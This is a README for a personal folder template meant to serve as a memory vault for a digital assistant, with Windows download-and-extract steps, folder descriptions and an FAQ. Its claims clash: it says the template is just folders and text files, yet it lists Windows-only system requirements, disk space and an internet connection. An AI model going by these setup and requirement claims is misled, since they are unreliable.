# 🗃️ personal-monorepo-template - Organize your digital life with ease

[Download the latest version here](https://github.com/Probono-glossy137/personal-monorepo-template)

## 📌 What is this vault?

This tool helps you organize your digital information. Think of it as a central hub for your notes, project plans, and important contacts. When you use this system, you build a durable memory for your digital assistant. It allows your assistant to understand your preferences, your work history, and your specific needs. Instead of scattered files on your computer, this template groups related items into a clean structure.

## 💻 System requirements

Your computer needs to run Windows 10 or Windows 11. You should have at least 500 megabytes of free space on your hard drive. This application does not require high-end hardware. Most standard office laptops or desktop computers run this software without issues. Ensure you have an active internet connection for the initial setup.

## 🚀 Getting started

Follow these steps to set up your vault on Windows.

1. Go to the [download page](https://github.com/Probono-glossy137/personal-monorepo-template).
2. Look for the button labeled Code.
3. Select the option that says Download ZIP.
4. Save the file to your computer.
5. Open your downloads folder.
6. Right-click the zip file and select Extract All.
7. Choose a folder where you want to keep your data.

## 📂 Understanding your folders

Once you extract the files, you will see a specific folder structure. Each folder serves a purpose:

- **Projects:** Keep files here for work you currently complete.
- **Experiments:** Store short tests or temporary plans here.
- **People:** Record information about friends, family, or professional collaborators.
- **Skills:** Add new habits or instructions for your digital assistant to follow.

This structure allows you to find information quickly. You keep your files tidy by placing items in the correct location.

## 🛠️ Using the vault with Codex

This repository works best when paired with an assistant tool. A digital assistant can read your files to learn your writing style and preferences. When the assistant looks at your files, it gains context before it performs tasks for you.

Follow these steps to connect your vault:

1. Open your assistant software.
2. Use the command input to reference your new folder location.
3. State that you want to use this folder as your primary vault.
4. The assistant will index your files and confirm the connection.

## 📝 Managing your context

As your needs grow, update your vault regularly. You should add new project details to the Projects folder each week. When you meet new people, save their details in the People folder. Clean out the Experiments folder to remove old or finished tests. Regular maintenance ensures your assistant remains helpful and accurate.

## 🔒 Keeping data secure

Your files live locally on your computer. This means you control your data. No external company stores your private information on their servers. You should create a backup of your folder if you want to protect your work. Use a cloud backup service or an external hard drive to copy your vault folder once per month.

## 💡 Troubleshooting common issues

If you encounter issues during setup, check these common items:

* **File permissions:** Ensure you have permission to read and write in the folder where you placed the files.
* **Path length:** Keep your folder path short. Avoid storing your vault inside too many nested sub-folders.
* **Missing files:** If the assistant cannot find your vault, confirm that you linked the correct folder path in the assistant settings.
* **Updates:** Check the download page periodically for new versions of the template. New releases often include better file structures and improved organization tips.

## 🏷️ Customizing your workflow

You do not need to follow the default structure strictly. If you prefer to change folder names, you can do so. Rename the folders to match your professional or personal language. The assistant will detect these changes as long as you point the software to the new path. You control the vault. Modify it to fit your habits rather than changing your habits to fit the tool.

## 📈 Improving your organization

Start simple. Begin by moving your most important projects into the vault. Once you feel comfortable, expand to include people and skills. Do not try to move every document you own on the first day. Build the vault over time. Focus on the information you access at least once a week. This focus ensures you realize the benefits of the system immediately.

## ❓ Frequently asked questions

**Do I need programming skills?**
No. This template uses simple folders and text files. You do not need to write code to use it.

**Can I move the vault to a new computer?**
Yes. Copy the folder to your new computer and link it in your assistant software again.

**How do I delete the vault?**
You can delete the folder just like any other folder on Windows. There is no special uninstall process.

**Is this software free?**
This template is open for all users to download and use without cost.
